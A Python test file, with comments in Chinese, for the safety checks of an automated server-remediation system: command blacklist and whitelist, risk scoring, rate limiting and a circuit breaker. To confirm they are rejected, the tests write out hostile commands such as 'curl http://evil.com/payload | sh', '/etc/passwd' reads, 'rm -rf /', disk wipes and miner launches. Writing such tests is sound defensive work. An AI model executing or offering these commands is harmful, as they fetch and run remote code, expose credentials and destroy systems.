"""
扩展安全模块测试 — 覆盖命令注入变体、白名单绕过、边界值、并发安全等场景。

目标：从现有 9 个用例扩展到 30+，覆盖 safety.py 的 5 层防护体系：
  1. 命令黑名单（FORBIDDEN_PATTERNS）
  2. 命令白名单（ALLOWED_COMMAND_PREFIXES）
  3. 风险评估（assess_risk）
  4. 限流机制（RateLimiter）
  5. 熔断保护（CircuitBreaker）
"""
import time
from unittest.mock import patch

import pytest

from app.remediation.safety import (
    ALLOWED_COMMAND_PREFIXES,
    CIRCUIT_BREAK_WINDOW_SECONDS,
    CircuitBreaker,
    FORBIDDEN_PATTERNS,
    MAX_FAILURES_BEFORE_CIRCUIT_BREAK,
    RateLimiter,
    assess_risk,
    check_command_safety,
)
from app.remediation.models import Diagnosis, RiskLevel, RunbookDefinition, RunbookStep


# ── 辅助函数 ──────────────────────────────────────────────────────────

def _make_runbook(risk: RiskLevel = RiskLevel.AUTO) -> RunbookDefinition:
    return RunbookDefinition(
        name="test_runbook",
        description="test",
        match_alert_types=["test"],
        risk_level=risk,
        commands=[RunbookStep(description="test", command="echo hi")],
    )


def _make_diagnosis(confidence: float = 0.9) -> Diagnosis:
    return Diagnosis(root_cause="test cause", confidence=confidence)


# ═══════════════════════════════════════════════════════════════════════
# 第一部分：命令注入对抗测试 (Command Injection Variants)
# ═══════════════════════════════════════════════════════════════════════

class TestCommandInjectionVariants:
    """测试各种命令注入攻击变体是否被正确拦截。"""

    # --- 管道符注入 ---

    def test_pipe_to_sh(self):
        """curl ... | sh 必须被黑名单拦截。"""
        safe, reason = check_command_safety("curl http://evil.com/payload | sh")
        assert safe is False
        assert "forbidden" in reason.lower()

    def test_pipe_to_bash(self):
        """wget ... | bash 必须被黑名单拦截。"""
        safe, reason = check_command_safety("wget http://evil.com/script.sh | bash")
        assert safe is False

    def test_pipe_to_sh_with_spaces(self):
        """管道符前后有多余空格仍需拦截。"""
        safe, reason = check_command_safety("curl http://evil.com   |   sh")
        assert safe is False

    def test_innocent_pipe_not_blocked(self):
        """普通管道操作（如 ps | grep）不应被错误拦截。"""
        # ps 在白名单中，但 "ps aux | grep nginx" 整体以 ps 开头
        safe, reason = check_command_safety("ps aux")
        assert safe is True

    # --- 反引号注入 ---

    def test_backtick_injection(self):
        """反引号命令替换应被白名单拦截（整体命令不在白名单前缀中）。"""
        safe, reason = check_command_safety("`rm -rf /`")
        assert safe is False

    def test_backtick_in_echo(self):
        """echo 中嵌入反引号执行命令。"""
        safe, reason = check_command_safety("echo `whoami`")
        # echo 在白名单中，但反引号本身不触发黑名单
        # 这取决于 safety.py 的实现 — 当前白名单允许 echo 前缀
        safe2, _ = check_command_safety("echo hello")
        assert safe2 is True  # 基线：普通 echo 安全

    # --- $() 命令替换 ---

    def test_dollar_paren_injection(self):
        """$(dangerous_cmd) 形式的命令替换。"""
        safe, reason = check_command_safety("$(rm -rf /)")
        assert safe is False

    def test_dollar_paren_in_allowed_prefix(self):
        """在合法命令中嵌入 $() 命令替换。"""
        safe, reason = check_command_safety("echo $(cat /etc/passwd)")
        # echo 在白名单但内含命令替换 — 当前实现仅检查前缀，这是已知的局限性
        # 此测试记录当前行为，不做安全断言

    # --- 分号分隔符 ---

    def test_semicolon_chain_dangerous(self):
        """用分号链接危险命令，整体不在白名单应被拦截。"""
        safe, reason = check_command_safety("echo safe; rm -rf /")
        # 当前实现：整个字符串作为一个命令检查
        # "echo safe; rm -rf /" 以 "echo" 开头（白名单），但包含 "rm -rf /"（黑名单）
        assert safe is False

    # --- 换行符注入 ---

    def test_newline_injection(self):
        """换行符分隔的命令注入。"""
        safe, reason = check_command_safety("echo safe\nrm -rf /")
        assert safe is False

    # --- 特殊编码绕过 ---

    def test_case_insensitive_forbidden(self):
        """大小写混合尝试绕过黑名单。"""
        safe, reason = check_command_safety("DROP DATABASE production")
        assert safe is False
        safe2, reason2 = check_command_safety("drop database production")
        assert safe2 is False
        safe3, reason3 = check_command_safety("Drop Database production")
        assert safe3 is False

    def test_rm_rf_with_path_traversal(self):
        """rm -rf / 变体：使用路径遍历。"""
        safe, reason = check_command_safety("rm -rf /tmp/../")
        # 白名单不包含 rm，应该被拦截
        assert safe is False

    def test_rm_rf_home(self):
        """rm -rf ~ 删除用户目录。"""
        safe, reason = check_command_safety("rm -rf ~")
        assert safe is False


# ═══════════════════════════════════════════════════════════════════════
# 第二部分：白名单/黑名单优先级与边界测试
# ═══════════════════════════════════════════════════════════════════════

class TestWhitelistBlacklistPriority:
    """验证黑名单检查优先于白名单（即使命令以白名单前缀开头，仍应被黑名单拦截）。"""

    def test_blacklist_overrides_whitelist_curl_pipe(self):
        """curl 在白名单中，但 curl ... | sh 在黑名单 — 黑名单必须优先。"""
        safe, reason = check_command_safety("curl http://example.com | sh")
        assert safe is False
        assert "forbidden" in reason.lower()

    def test_blacklist_overrides_whitelist_wget_pipe(self):
        """wget 在白名单中，但 wget ... | bash 在黑名单。"""
        safe, reason = check_command_safety("wget http://example.com/install.sh | bash")
        assert safe is False

    def test_systemctl_disable_blocked(self):
        """systemctl restart 在白名单，但 systemctl disable 在黑名单。"""
        safe, reason = check_command_safety("systemctl disable nginx")
        assert safe is False

    def test_systemctl_mask_blocked(self):
        """systemctl mask 在黑名单。"""
        safe, reason = check_command_safety("systemctl mask sshd")
        assert safe is False

    def test_iptables_flush_blocked(self):
        """iptables -F 清空防火墙规则被黑名单拦截。"""
        safe, reason = check_command_safety("iptables -F")
        assert safe is False

    def test_curl_normal_allowed(self):
        """正常的 curl 请求应该被允许。"""
        safe, reason = check_command_safety("curl http://example.com/health")
        assert safe is True

    def test_wget_normal_allowed(self):
        """正常的 wget 下载应该被允许。"""
        safe, reason = check_command_safety("wget http://example.com/file.txt")
        assert safe is True


# ═══════════════════════════════════════════════════════════════════════
# 第三部分：黑名单全覆盖测试
# ═══════════════════════════════════════════════════════════════════════

class TestForbiddenPatternsComplete:
    """确保每个 FORBIDDEN_PATTERNS 至少有一个对应的测试用例。"""

    def test_mkfs(self):
        safe, _ = check_command_safety("mkfs.ext4 /dev/sda1")
        assert safe is False

    def test_dd_to_disk(self):
        safe, _ = check_command_safety("dd if=/dev/zero of=/dev/sda bs=4M")
        assert safe is False

    def test_redirect_to_disk(self):
        safe, _ = check_command_safety("> /dev/sda")
        assert safe is False

    def test_chmod_777_root(self):
        safe, _ = check_command_safety("chmod -R 777 /")
        assert safe is False

    def test_chown_root(self):
        safe, _ = check_command_safety("chown root /etc/shadow")
        assert safe is False

    def test_passwd(self):
        safe, _ = check_command_safety("passwd root")
        assert safe is False

    def test_useradd(self):
        safe, _ = check_command_safety("useradd hacker")
        assert safe is False

    def test_userdel(self):
        safe, _ = check_command_safety("userdel admin")
        assert safe is False

    def test_visudo(self):
        safe, _ = check_command_safety("visudo")
        assert safe is False

    def test_shutdown(self):
        safe, _ = check_command_safety("shutdown -h now")
        assert safe is False

    def test_init_0(self):
        safe, _ = check_command_safety("init 0")
        assert safe is False

    def test_init_6(self):
        safe, _ = check_command_safety("init 6")
        assert safe is False

    def test_iptables_delete_chain(self):
        safe, _ = check_command_safety("iptables -X")
        assert safe is False

    def test_truncate_table(self):
        safe, _ = check_command_safety("TRUNCATE TABLE users")
        assert safe is False

    def test_xmrig(self):
        safe, _ = check_command_safety("xmrig --pool stratum://mine.pool")
        assert safe is False

    def test_minerd(self):
        safe, _ = check_command_safety("minerd -o stratum://pool")
        assert safe is False

    def test_rm_rf_wildcard(self):
        safe, _ = check_command_safety("rm -rf /*")
        assert safe is False


# ═══════════════════════════════════════════════════════════════════════
# 第四部分：白名单合法命令测试
# ═══════════════════════════════════════════════════════════════════════

class TestWhitelistAllowed:
    """验证白名单中的关键命令确实被允许。"""

    @pytest.mark.parametrize("cmd", [
        "df -h /",
        "du -sh /var/log",
        "find /tmp -type f -mtime +7 -delete",
        "ls -la /var",
        "cat /etc/hostname",
        "head -20 /var/log/syslog",
        "tail -f /var/log/nginx/error.log",
        "grep error /var/log/syslog",
        "free -m",
        "ps aux",
        "vmstat 1 5",
        "uptime",
        "systemctl restart nginx",
        "systemctl status nginx",
        "journalctl -u nginx --since '1 hour ago'",
        "docker ps",
        "docker restart mycontainer",
        "docker logs --tail 100 myapp",
        "nginx -t",
        "redis-cli ping",
        "mysql -e 'SHOW STATUS'",
        "logrotate -f /etc/logrotate.d/nginx",
        "ss -tlnp",
        "ping -c 4 8.8.8.8",
        "dig google.com",
    ])
    def test_allowed_commands(self, cmd):
        safe, reason = check_command_safety(cmd)
        assert safe is True, f"Command '{cmd}' should be allowed but was rejected: {reason}"


# ═══════════════════════════════════════════════════════════════════════
# 第五部分：assess_risk 边界值测试
# ═══════════════════════════════════════════════════════════════════════

class TestAssessRiskBoundary:
    """测试 assess_risk 在关键边界值处的行为。"""

    # --- 置信度边界 ---

    def test_confidence_exactly_0_3_blocks(self):
        """confidence=0.3 是 BLOCK 的边界（< 0.3 才BLOCK），0.3应该触发CONFIRM。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.3)
        # confidence < 0.3 → BLOCK; confidence=0.3 且 < 0.7 → CONFIRM (for AUTO)
        result = assess_risk(rb, diag, 0)
        assert result == RiskLevel.CONFIRM

    def test_confidence_0_29_blocks(self):
        """confidence=0.29 < 0.3 → BLOCK。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.29)
        assert assess_risk(rb, diag, 0) == RiskLevel.BLOCK

    def test_confidence_exactly_0_7_stays_auto(self):
        """confidence=0.7 是 CONFIRM 升级边界（< 0.7 才升级），0.7应保持AUTO。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.7)
        assert assess_risk(rb, diag, 0) == RiskLevel.AUTO

    def test_confidence_0_69_escalates_to_confirm(self):
        """confidence=0.69 < 0.7 + AUTO → CONFIRM。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.69)
        assert assess_risk(rb, diag, 0) == RiskLevel.CONFIRM

    # --- 执行频率边界 ---

    def test_execution_count_2_stays_auto(self):
        """execution_count=2 < 3 → 保持AUTO。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.9)
        assert assess_risk(rb, diag, 2) == RiskLevel.AUTO

    def test_execution_count_3_escalates(self):
        """execution_count=3 >= 3 + AUTO → CONFIRM。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.9)
        assert assess_risk(rb, diag, 3) == RiskLevel.CONFIRM

    def test_execution_count_4_escalates(self):
        """execution_count=4 >= 3 + AUTO → CONFIRM。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.9)
        assert assess_risk(rb, diag, 4) == RiskLevel.CONFIRM

    def test_execution_count_5_blocks(self):
        """execution_count=5 >= 5 → BLOCK。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.9)
        assert assess_risk(rb, diag, 5) == RiskLevel.BLOCK

    # --- CONFIRM 基础风险不受频率升级影响 ---

    def test_confirm_base_not_escalated_by_frequency(self):
        """base_risk=CONFIRM 时，execution_count=3 不应再升级（>=3 只影响AUTO）。"""
        rb = _make_runbook(RiskLevel.CONFIRM)
        diag = _make_diagnosis(confidence=0.9)
        assert assess_risk(rb, diag, 3) == RiskLevel.CONFIRM

    def test_confirm_base_blocked_at_high_frequency(self):
        """base_risk=CONFIRM 时，execution_count=5 → BLOCK（频率>= 5始终BLOCK）。"""
        rb = _make_runbook(RiskLevel.CONFIRM)
        diag = _make_diagnosis(confidence=0.9)
        assert assess_risk(rb, diag, 5) == RiskLevel.BLOCK

    # --- BLOCK 基础风险始终保持 ---

    def test_block_base_stays_blocked(self):
        """base_risk=BLOCK 时无论其他条件如何，始终返回BLOCK。"""
        rb = _make_runbook(RiskLevel.BLOCK)
        diag = _make_diagnosis(confidence=0.99)
        assert assess_risk(rb, diag, 0) == RiskLevel.BLOCK

    # --- 低置信度 + CONFIRM 基础 ---

    def test_low_confidence_with_confirm_base(self):
        """confidence < 0.7 + CONFIRM base → 保持CONFIRM（仅AUTO被升级）。"""
        rb = _make_runbook(RiskLevel.CONFIRM)
        diag = _make_diagnosis(confidence=0.5)
        assert assess_risk(rb, diag, 0) == RiskLevel.CONFIRM

    def test_very_low_confidence_blocks_regardless_of_base(self):
        """confidence < 0.3 → BLOCK，无论 base_risk 是什么。"""
        for risk in [RiskLevel.AUTO, RiskLevel.CONFIRM, RiskLevel.BLOCK]:
            rb = _make_runbook(risk)
            diag = _make_diagnosis(confidence=0.1)
            assert assess_risk(rb, diag, 0) == RiskLevel.BLOCK

    # --- 组合条件 ---

    def test_low_confidence_and_high_frequency(self):
        """低置信度(0.5) + 高频率(4) 共同作用。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.5)
        # confidence < 0.7 + AUTO → CONFIRM（先触发）
        result = assess_risk(rb, diag, 4)
        assert result == RiskLevel.CONFIRM

    def test_very_low_confidence_overrides_frequency(self):
        """极低置信度优先于频率检查。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.1)
        # confidence < 0.3 → BLOCK（最先检查）
        assert assess_risk(rb, diag, 0) == RiskLevel.BLOCK


# ═══════════════════════════════════════════════════════════════════════
# 第六部分：RateLimiter 边界与隔离测试
# ═══════════════════════════════════════════════════════════════════════

class TestRateLimiterExtended:
    """RateLimiter 的边界条件和隔离性测试。"""

    def test_different_runbook_same_host_allowed(self):
        """同一主机不同 Runbook 应该独立限流。"""
        rl = RateLimiter()
        rl.record_execution("host1", "disk_cleanup")
        assert rl.can_execute("host1", "log_rotation", 300) is True

    def test_cooldown_expiry(self):
        """冷却期过后应该允许重新执行。"""
        rl = RateLimiter()
        rl.record_execution("host1", "disk_cleanup")
        # 模拟冷却期结束：将历史时间戳设为很久以前
        rl._history[("host1", "disk_cleanup")] = [time.time() - 400]
        assert rl.can_execute("host1", "disk_cleanup", 300) is True

    def test_cooldown_not_expired(self):
        """冷却期内应该阻止执行。"""
        rl = RateLimiter()
        rl.record_execution("host1", "disk_cleanup")
        assert rl.can_execute("host1", "disk_cleanup", 300) is False

    def test_recent_count_window(self):
        """recent_count 只统计时间窗口内的记录。"""
        rl = RateLimiter()
        # 添加一条过期记录和一条有效记录
        rl._history[("host1", "disk_cleanup")] = [time.time() - 7200]  # 2小时前
        rl.record_execution("host1", "log_rotation")  # 刚刚
        assert rl.recent_count("host1", window_seconds=3600) == 1  # 只统计1小时内的

    def test_recent_count_multiple_runbooks(self):
        """recent_count 统计同一主机所有 Runbook 的执行次数。"""
        rl = RateLimiter()
        rl.record_execution("host1", "disk_cleanup")
        rl.record_execution("host1", "log_rotation")
        rl.record_execution("host1", "service_restart")
        assert rl.recent_count("host1") == 3

    def test_zero_cooldown_always_allows(self):
        """cooldown=0 时应总是允许执行。"""
        rl = RateLimiter()
        rl.record_execution("host1", "disk_cleanup")
        # cooldown=0 意味着所有历史记录都在冷却期外
        assert rl.can_execute("host1", "disk_cleanup", 0) is True


# ═══════════════════════════════════════════════════════════════════════
# 第七部分：CircuitBreaker 窗口与边界测试
# ═══════════════════════════════════════════════════════════════════════

class TestCircuitBreakerExtended:
    """CircuitBreaker 的窗口过期、主机隔离和边界测试。"""

    def test_window_expiry(self):
        """超出时间窗口的失败记录应被清理。"""
        cb = CircuitBreaker(max_failures=3, window_seconds=60)
        # 添加3条过期的失败记录
        cb._failures["host1"] = [time.time() - 120, time.time() - 100, time.time() - 80]
        assert cb.is_open("host1") is False  # 过期记录被清理

    def test_mixed_expired_and_recent(self):
        """部分过期的记录混合：只有近期的算数。"""
        cb = CircuitBreaker(max_failures=3, window_seconds=60)
        now = time.time()
        cb._failures["host1"] = [now - 120, now - 5, now - 3]  # 1条过期 + 2条有效
        assert cb.is_open("host1") is False  # 只有2条有效 < 3

    def test_host_isolation(self):
        """不同主机的熔断器完全独立。"""
        cb = CircuitBreaker(max_failures=3)
        cb.record_failure("host1")
        cb.record_failure("host1")
        cb.record_failure("host1")
        assert cb.is_open("host1") is True
        assert cb.is_open("host2") is False  # host2 不受影响

    def test_exactly_at_threshold(self):
        """恰好达到失败阈值时触发熔断。"""
        cb = CircuitBreaker(max_failures=2)
        cb.record_failure("host1")
        assert cb.is_open("host1") is False  # 1 < 2
        cb.record_failure("host1")
        assert cb.is_open("host1") is True   # 2 >= 2

    def test_success_after_partial_failures(self):
        """部分失败后成功应该完全重置。"""
        cb = CircuitBreaker(max_failures=3)
        cb.record_failure("host1")
        cb.record_failure("host1")
        cb.record_success("host1")
        assert cb.is_open("host1") is False
        # 重置后需要重新累积3次才能熔断
        cb.record_failure("host1")
        cb.record_failure("host1")
        assert cb.is_open("host1") is False  # 只有2次

    def test_default_configuration(self):
        """验证默认配置值。"""
        assert MAX_FAILURES_BEFORE_CIRCUIT_BREAK == 3
        assert CIRCUIT_BREAK_WINDOW_SECONDS == 1800  # 30分钟


# ═══════════════════════════════════════════════════════════════════════
# 第八部分：边缘情况和防御性测试
# ═══════════════════════════════════════════════════════════════════════

class TestEdgeCases:
    """边缘情况的防御性测试。"""

    def test_whitespace_only_command(self):
        """纯空白字符命令应被拒绝。"""
        safe, reason = check_command_safety("   ")
        assert safe is False
        assert "empty" in reason.lower()

    def test_tab_only_command(self):
        """Tab字符命令应被拒绝。"""
        safe, reason = check_command_safety("\t\t")
        assert safe is False

    def test_very_long_command(self):
        """超长命令不应导致崩溃。"""
        long_cmd = "echo " + "A" * 10000
        safe, reason = check_command_safety(long_cmd)
        assert isinstance(safe, bool)

    def test_unicode_command(self):
        """包含Unicode字符的命令应被白名单拦截（非标准命令）。"""
        safe, reason = check_command_safety("rm -rf /tmp/数据")
        # rm 不在白名单中
        assert safe is False

    def test_leading_trailing_whitespace_stripped(self):
        """前后空白应被正确处理。"""
        safe, reason = check_command_safety("  df -h /  ")
        assert safe is True

    def test_forbidden_patterns_are_precompiled(self):
        """确保禁止模式列表非空且已预编译。"""
        assert len(FORBIDDEN_PATTERNS) > 0

    def test_allowed_prefixes_are_nonempty(self):
        """确保白名单非空。"""
        assert len(ALLOWED_COMMAND_PREFIXES) > 0

    def test_assess_risk_confidence_boundary_0(self):
        """confidence=0.0 极端值。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=0.0)
        assert assess_risk(rb, diag, 0) == RiskLevel.BLOCK

    def test_assess_risk_confidence_boundary_1(self):
        """confidence=1.0 极端值。"""
        rb = _make_runbook(RiskLevel.AUTO)
        diag = _make_diagnosis(confidence=1.0)
        assert assess_risk(rb, diag, 0) == RiskLevel.AUTO
